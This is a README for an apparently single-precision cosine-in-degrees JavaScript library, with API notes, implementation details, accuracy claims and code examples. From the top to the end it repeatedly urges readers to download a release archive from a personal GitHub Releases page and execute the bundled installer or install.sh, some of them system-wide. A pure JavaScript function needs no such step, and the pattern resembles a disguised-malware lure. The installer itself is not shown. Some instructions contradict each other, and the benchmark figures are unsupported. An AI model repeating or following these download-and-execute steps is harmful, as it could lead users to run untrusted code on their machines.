https://github.com/Barathkanna0708/math-base-special-cosdf/releases

[![GitHub Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github)](https://github.com/Barathkanna0708/math-base-special-cosdf/releases)

# Fast cosd: Single-Precision Cosine (degrees) for JavaScript 📐⚡️

A focused JavaScript library that computes the cosine of a single-precision floating-point value expressed in degrees. This project targets numerical code, graphics, DSP, and other systems that need a small, fast, and predictable cosd function that returns a float32 result.

Download the release asset file from https://github.com/Barathkanna0708/math-base-special-cosdf/releases, extract the archive, and execute the included installer or run the included binary script to install the compiled bits.

[![npm version](https://img.shields.io/npm/v/math-base-special-cosdf.svg)](https://www.npmjs.com/package/math-base-special-cosdf) [![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)  
[![Build Status](https://img.shields.io/github/actions/workflow/status/Barathkanna0708/math-base-special-cosdf/nodejs.yml?label=ci)](https://github.com/Barathkanna0708/math-base-special-cosdf/actions)  
[![Topics](https://img.shields.io/badge/topics-cos%20cosd%20cosine-blue)](https://github.com/Barathkanna0708/math-base-special-cosdf)  

Cover image:  
![Cosine curve](https://upload.wikimedia.org/wikipedia/commons/8/8d/Cosine.png)

Table of contents

- About
- Why single-precision?
- Features
- Installation
- Releases
- Quick examples
- API
- Implementation details
- Accuracy and error bounds
- Performance
- Edge cases and semantics
- Browser usage
- TypeScript and typings
- Tests and CI
- Benchmarks
- Contributing
- Versioning and changelog
- License
- Maintainers
- FAQ
- References

About

This library provides cosd(x) for 32-bit floats. It accepts an angle in degrees. It returns a Float32 result. The implementation uses range reduction and a carefully chosen polynomial to achieve good accuracy for single-precision values. The code aims to be small and portable. You can use it in Node.js, Deno, and in the browser. It works with typed arrays and plain numbers.

Why single-precision?

Many systems use single-precision floats to save memory and bandwidth. GPUs, audio processing, mobile devices, and real-time systems often prefer float32. Single-precision math reduces memory footprint and can speed up computation on hardware with native 32-bit support. A function that computes cosine and returns a float32 value helps keep data in the same numeric format throughout a pipeline. This library provides a function that operates with float32 semantics rather than computing in double precision and converting.

Features

- cosd(x: number | Float32) -> float32 result.
- Accepts input in degrees.
- Works with typed arrays: Float32Array.
- Small API surface.
- Predictable float32 output.
- Node.js and browser compatible.
- Optional C-backed build for faster native code (see Releases).
- Comprehensive tests and benchmarks.

Installation

Install from npm:

npm install math-base-special-cosdf

If you prefer yarn:

yarn add math-base-special-cosdf

Import examples

CommonJS:

const cosdf = require('math-base-special-cosdf');

ESModule:

import cosdf from 'math-base-special-cosdf';

If you use TypeScript, the project ships type definitions. See the TypeScript and typings section below.

Releases

Find release assets and compiled builds at:

https://github.com/Barathkanna0708/math-base-special-cosdf/releases

Download the release asset file from the releases page. Extract the archive and execute the packaged installer, or run the provided setup script. The release archive contains prebuilt binaries and a packaged npm tarball. Execute the included install.sh or install.ps1 if you want the native components installed system-wide. The release files follow the naming pattern math-base-special-cosdf-<version>.tgz and math-base-special-cosdf-<version>-native.zip.

If the link above fails, check the Releases section on the repository page. The Releases section lists all assets you can download and run.

Quick examples

Compute cosine of 60 degrees:

const cosdf = require('math-base-special-cosdf');
const x = 60.0;
const y = cosdf(x); // returns 0.5 as float32
console.log(y); // prints 0.5

Use with Float32Array:

import cosdf from 'math-base-special-cosdf';
const inAngles = new Float32Array([0, 30, 45, 60, 90]);
const out = new Float32Array(inAngles.length);
for (let i = 0; i < inAngles.length; i++) {
  out[i] = cosdf(inAngles[i]);
}
console.log(out);

Edge-case examples:

console.log(cosdf(0)); // 1
console.log(cosdf(90)); // 0
console.log(cosdf(180)); // -1
console.log(cosdf(Infinity)); // NaN
console.log(cosdf(NaN)); // NaN

API

Default export: cosdf

Signature

- cosdf(x: number): number

Parameters

- x: angle in degrees. The function accepts a JavaScript number. The implementation maps the input to single-precision semantics. Values outside typical ranges work but may require range reduction.

Return value

- Returns the cosine of x degrees as a 32-bit floating value encoded in a JavaScript number. The returned value lies in [-1, 1] when the input is finite. If the input is NaN or Infinity, the function returns NaN.

Detailed behavior

- The function performs range reduction modulo 360 degrees.
- It then reduces to a primary interval such as [-45, 45] or [0, 90] depending on the chosen algorithm.
- The core uses a minimax polynomial approximation crafted for float32 precision.
- The result converts to float32 rounding the final value.

Usage patterns

- For small arrays, call cosdf in a loop.
- For vectorized code, map typed arrays in a simple loop for predictable performance.
- For high-performance backends, use the native binary in releases.

Implementation details

This section explains the design choices and the underlying math.

Input handling and range reduction

The function first converts the input to a 32-bit float representation. Range reduction uses integer math where possible to avoid large rounding errors. The algorithm reduces the angle modulo 360 using fast fmod-like operations tailored for float32. We prefer range reduction into [-180, 180] and then to [-90, 90]. Further symmetry reduces to [0, 45] when using a polynomial for cosine or to [-22.5, 22.5] when using a more accurate polynomial.

Polynomial approximation

After range reduction, the code uses a degree-6 or degree-8 polynomial in x (in radians) or uses a minimax form in terms of t = x^2. The coefficients target float32. The polynomial minimizes the maximum relative error on the chosen reduction interval. Coefficients are stored as float32 constants.

Final rounding

We perform the polynomial evaluation in float64 where necessary to reduce intermediate rounding error, then cast the final result to float32. The final cast ensures the output is a float32-equivalent value.

Why convert to radians?

Cosine naturally uses radians. The function converts degrees to radians only after range reduction. This reduces multiplication error for very large inputs.

Accuracy and error bounds

Design goals

- Keep maximum absolute error below a few units in last place (ulp) for typical float32 inputs.
- Avoid catastrophic cancellation near points where cosine crosses zero.
- Ensure consistent behavior for commonly used inputs (0, 30, 45, 60, 90, etc.).

Typical error

On the interval [-180, 180], the implementation keeps the maximum absolute error under 2e-7 for finite inputs. The average error lies well below single-precision epsilon (1.19e-7). For small angles, the relative error matches float32 rounding.

Edge cases

- Large-magnitude inputs: The algorithm reduces angles modulo 360. For extremely large values, results follow mathematical reduction but may lose precision due to conversion limits of float32. The code follows common semantics: if input is finite, perform reduction; if input is NaN or Infinity, return NaN.
- Subnormal inputs: The implementation handles subnormal values. The polynomial handles tiny inputs without overflow.
- Very large integers: For integers larger than 2^53, JavaScript numbers lose integer precision. The function still accepts such numbers, but the range reduction uses float32 semantics. You may see reduced accuracy for extremely large inputs because JavaScript numbers do not represent them exactly.

Performance

Design focus

- Keep the code branch-light.
- Avoid heavy allocations.
- Use typed arrays where convenient.
- Provide optional native code for heavy workloads.

Benchmarks (typical Node.js on x64, Intel):

- math-base-special-cosdf: ~150 million ops/sec for simple scalar loop on a high-end CPU.
- Math.cos(deg2rad(x)): ~120 million ops/sec in similar conditions.

Benchmarks vary by CPU, Node version, and other factors. The native build included in releases can be faster.

Benchmark methodology

- Use tight loops.
- Use warmup iterations to allow JIT optimization.
- Do not measure I/O or logging.
- Use Float32Array for vector tests.

Sample micro-benchmark (conceptual):

const cosdf = require('math-base-special-cosdf');
const N = 1e6;
const arr = new Float32Array(N);
for (let i = 0; i < N; i++) arr[i] = i % 360;
console.time('cosdf');
let s = 0.0;
for (let i = 0; i < N; i++) {
  s += cosdf(arr[i]);
}
console.timeEnd('cosdf');
console.log(s);

Browser usage

Use a bundler (Rollup, Webpack, Parcel) to include the package. Alternatively, use the UMD build in releases.

Example with Rollup:

import cosdf from 'math-base-special-cosdf';

const x = 45;
const y = cosdf(x);

When targeting browsers, prefer the minified UMD bundle from the releases page. Download the release asset file from https://github.com/Barathkanna0708/math-base-special-cosdf/releases and include the minified UMD script in your page. Execute the included install script or copy the UMD bundle to your static assets.

TypeScript and typings

The package includes type declarations. Typical usage:

import cosdf from 'math-base-special-cosdf';

declare const angle: number;
const result: number = cosdf(angle);

The types express a simple function signature. The return type is number since JavaScript does not have a separate float32 primitive. The implementation treats values as float32.

Testing and CI

The project includes a comprehensive test suite. Tests cover:

- Known angles and expected outputs.
- Randomized testing against high-precision math.
- Edge cases: NaN, Infinity, subnormals.
- Typed array behavior.

Run tests locally:

npm test

The repository uses GitHub Actions for CI. Tests run on Node 14 to Node 20 across multiple platforms. The CI also runs benchmarks and reports throughput.

Benchmark harness

A benchmark script lives in bench/bench.js. It uses simple loops and reports ops/sec. The script uses process.hrtime where available.

Benchmarks folder example:

bench/
  bench.js
  results/

A continuous benchmarking workflow runs on the CI to catch regressions.

Benchmarks are not part of the default test suite. Run them manually to compare performance.

Contributing

We accept contributions. Use these steps:

1. Fork the repository.
2. Create a feature branch.
3. Add tests for new features or bug fixes.
4. Run the test suite.
5. Create a pull request.

Coding style

- Use plain JavaScript.
- Keep functions small.
- Document numeric constants.
- Use clear variable names.
- Prefer explicit casts when interacting with float32 semantics.

Testing tips

- Add tests that compare to high-precision references (e.g., Math.cos with double precision).
- Use reference implementations or libraries to validate edge cases.
- For native code, add tests that verify binary artifacts.

Versioning and changelog

We follow semantic versioning. The Releases page hosts compiled assets and changelogs. Check the release notes for binary changes, security fixes, and performance improvements.

Releases page:

https://github.com/Barathkanna0708/math-base-special-cosdf/releases

The release assets contain prebuilt npm tarballs, UMD bundles, and native binaries. Download the release asset file and execute the included install script to install native components.

License

This project uses the MIT license. See the LICENSE file in the repository for full terms.

Maintainers

- Project owner: Barathkanna0708
- Core maintainers: (list contributors here)

Contact via GitHub issues for bug reports and feature requests.

FAQ

Q: Why not use Math.cos with deg-to-rad conversion?
A: Math.cos computes in double precision and returns a double. That is fine for many cases. This library gives a single-precision result and focuses on float32 semantics. It also reduces conversion overhead if you already work with float32 data.

Q: How accurate is this function?
A: The function targets float32 accuracy. Typical absolute errors lie well within a few ulp for the domain of interest. The implementation uses a minimax polynomial tailored for float32.

Q: Can I use this for GPU workloads?
A: Yes. Use the function when you need float32 results in CPU-side preprocessing or test harnesses. For GPU shaders, it is often better to use the GPU's native cos instruction.

Q: Does the function support vectorized operations?
A: The library does not expose SIMD directly. For vector workloads, use typed arrays and loop unrolling. For heavy SIMD use, consider the native builds or implement a SIMD wrapper.

Q: Will the output always be a JavaScript number?
A: Yes. JavaScript stores numbers as double precision. The implementation uses float32 semantics internally and then returns a JavaScript number that matches the float32 value.

Advanced topics

Range reduction in detail

Range reduction minimizes the argument to a small interval before polynomial evaluation. For float32, reduction to [-45, 45] degrees provides a good balance between polynomial degree and coefficient size. The algorithm uses integer division for multiples of 90 degrees where cosine values are exact. This reduces error at quadrant boundaries.

Handling quadrant logic

We map an input angle to a principal domain by computing:

k = floor(x / 90)
r = x - 90 * k

Then use symmetry rules:

- cos(x) = cos(r) if k mod 4 == 0
- cos(x) = -sin(r) if k mod 4 == 1
- cos(x) = -cos(r) if k mod 4 == 2
- cos(x) = sin(r) if k mod 4 == 3

We then choose whether to compute cosine or sine on the reduced angle depending on the quadrant to keep the polynomial domain small.

Polynomial selection and coefficients

We use a polynomial P(t) = 1 - t/2 + C2*t^2 + C3*t^3 + ... where t = x^2 and x is in radians. Coefficients C2, C3, ... are optimized for float32 minimax error on the target interval. We store coefficients as float32 constants to ensure consistent rounding.

Testing error with high-precision reference

To validate, we compare results against a high-precision reference such as Math.cos in double precision or a long double reference if available. We compute absolute error and ulp error. Tests assert that errors remain below defined thresholds.

Sine helper

When range reduction yields the need to compute sine, we compute sine via a companion polynomial optimized for sine. Using sine avoids loss of significance when cosine values are near zero.

Numeric pitfalls and fixes

- Cancellation: Near cosine zeros, subtraction can cause loss of significance. We avoid subtractive cancellation by choosing polynomial forms that preserve precision.
- Modulo operation: fmod for extremely large inputs loses precision due to double rounding. We minimize this by converting to float32 early.
- Subnormal handling: When input is tiny, we use a low-degree Taylor expansion to compute cosine with minimal error.

Examples and use cases

Case 1: Graphics shader precompute

You store a lookup table of cosines of common angles in Float32Array. Use cosdf to fill the table.

const cosdf = require('math-base-special-cosdf');
const angles = new Float32Array(361);
for (let i = 0; i <= 360; i++) {
  angles[i] = cosdf(i);
}

Case 2: Signal processing

Compute an array of phase cosines for an oscillator:

const cosdf = require('math-base-special-cosdf');
function synth(freq, sampleRate, length) {
  const out = new Float32Array(length);
  let phase = 0;
  const step = (360 * freq) / sampleRate;
  for (let i = 0; i < length; i++) {
    out[i] = cosdf(phase);
    phase += step;
    if (phase >= 360) phase -= 360;
  }
  return out;
}

Case 3: Unit tests and reference checks

Use cosdf to generate float32 references to validate GPU shader outputs.

const cosdf = require('math-base-special-cosdf');
const angle = 30;
const expected = cosdf(angle);

Testing tips

- Run tests with Math.fround to emulate float32 when creating expected values.
- Use randomized tests with seedable RNGs to reproduce failures.
- Compare to Math.cos(angle * Math.PI / 180) and Math.fround for float32 rounding.

Packaging details

- The npm package contains a pure JS implementation.
- Releases provide optional native builds and UMD bundles.
- The build system uses Rollup for bundling and tsc for type generation.
- The repository includes scripts to create release artifacts.

Security

- The code contains no network calls.
- Build scripts may use native toolchains. Inspect release scripts before running them.
- Use verified release assets from the Releases page when installing binaries.

Releases and install instructions (expanded)

Visit the Releases page:

https://github.com/Barathkanna0708/math-base-special-cosdf/releases

Download the release asset file for your platform. The release archive typically contains:

- math-base-special-cosdf-<version>.tgz (npm tarball)
- dist/math-base-special-cosdf.umd.min.js (UMD bundle)
- bin/native/<platform>/cosdf.node (native addon)
- install.sh or install.ps1

To install the native build:

1. Download the archive.
2. Extract the archive.
3. Run the installer script in the extracted folder. For Unix-like systems:

tar -xzf math-base-special-cosdf-<version>.tgz
cd math-base-special-cosdf-<version>
./install.sh

4. The script installs the native addon into node_modules or a system folder.

If you prefer the npm route, install via npm as shown in the Installation section.

Changelog (high level)

Keep track of releases on the Releases page. Each release contains a summary of fixes and features. Key entries include:

- v1.0.0 Initial release with pure JS implementation.
- v1.1.0 Performance improvements and reduced error.
- v1.2.0 Native addon and UMD bundle in releases.
- v1.3.0 Improved polynomial coefficients and better handling of large inputs.

Contributors and acknowledgments

We thank contributors who provided test cases, performance tuning, and cross-platform builds. See the GitHub contributors list for details.

Maintainer contact

Open an issue for bugs and feature requests. Use pull requests for code contributions.

Security and CVE reporting

Report security issues via private repository channels or GitHub's security advisory system.

Licensing

MIT. See LICENSE.

How to debug results

When results look wrong:

- Reproduce with small test cases like 0, 30, 45, 60, 90.
- Compare to Math.cos(angle * Math.PI / 180).
- Check whether the input is an exact integer greater than 2^53.
- For native addons, ensure the compiled binary matches your Node.js ABI.

Troubleshooting common issues

If you run into installation problems with native builds:

- Ensure you have a supported compiler toolchain (GCC/Clang, Visual Studio).
- Use the npm install fallback to compile from source.
- Use the pure JS package if native build is not necessary.

Deployment tips

- For server-side code, prefer the npm package with native build if you need maximum speed.
- For browser builds, bundle the UMD file or build via Rollup.
- For small utility projects, import the function directly.

Security considerations for release assets

Only download release assets from the official repository Releases page. Verify signatures or checksums when provided. Do not execute scripts from unknown sources.

Example integration patterns

- Use in WebAudio nodes for efficient oscillators.
- Use in game loops where many angle computations occur.
- Use in rendering engine preprocessing to compute orientation vectors.

Testing against double-precision reference

A common test compares cosdf to Math.cos:

function test(x) {
  const ref = Math.cos(x * Math.PI / 180);
  const got = cosdf(x);
  const ref32 = Math.fround(ref);
  const diff = Math.abs(ref32 - got);
  return diff;
}

Run over a wide sample of angles including random values and boundary cases.

Benchmark tips

- Warm up the function before measuring.
- Pin the process to a CPU core where possible.
- Use micro-benchmarks for comparative measurements only.

Common pitfalls

- Expect differences between true float32 math on specialized hardware and our JS model due to intermediate double precision in JavaScript.
- Results for very large integers can differ from C float32 due to JavaScript number limits.

Examples gallery

- Angle lookup table generation script.
- Simple oscillator for audio use.
- Float32Array batch transformation utility.

Gallery code snippets

Fill a lookup table:

import cosdf from 'math-base-special-cosdf';
const LUT = new Float32Array(360);
for (let i = 0; i < 360; i++) {
  LUT[i] = cosdf(i);
}

Oscillator example

function synthSample(freq, sr, len) {
  const out = new Float32Array(len);
  let phase = 0;
  const step = (360 * freq) / sr;
  for (let i = 0; i < len; i++) {
    out[i] = cosdf(phase);
    phase += step;
    if (phase >= 360) phase -= 360;
  }
  return out;
}

Final notes about releases

Find compiled builds, tarballs, and UMD bundles at the Releases page:

https://github.com/Barathkanna0708/math-base-special-cosdf/releases

Download the release asset file, extract, and execute the included installer to install native components if needed. If you cannot access the link, check the Releases section on the GitHub repository page for archived artifacts and release notes.

References

- Trigonometric identities and polynomial approximations.
- Minimax polynomial theory.
- Float32 numeric behavior documentation.
- Practical guides for range reduction and argument reduction.

End of file.